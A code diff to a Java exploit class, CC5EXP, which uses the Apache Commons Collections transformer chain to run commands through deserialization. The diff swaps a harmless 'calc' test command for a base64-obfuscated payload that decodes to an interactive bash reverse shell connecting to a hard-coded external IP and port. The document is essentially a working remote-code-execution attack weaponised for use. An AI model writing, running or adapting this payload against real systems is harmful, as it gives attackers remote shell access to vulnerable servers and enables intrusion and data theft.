@@ -1,3 +1,5 @@
+package CC5EXP;
+
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -20,7 +22,7 @@ public class CC5EXP {
                         new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                 new InvokerTransformer("invoke"
                         , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
-                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
+                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"\"/bin/bash\", \"-c\", \"{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84MS42OC4xMjAuMTQvMjMzNCAwPiYx}|{base64,-d}|{bash,-i}\"}"})
         };
         ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
         HashMap<Object, Object> hashMap = new HashMap<>();
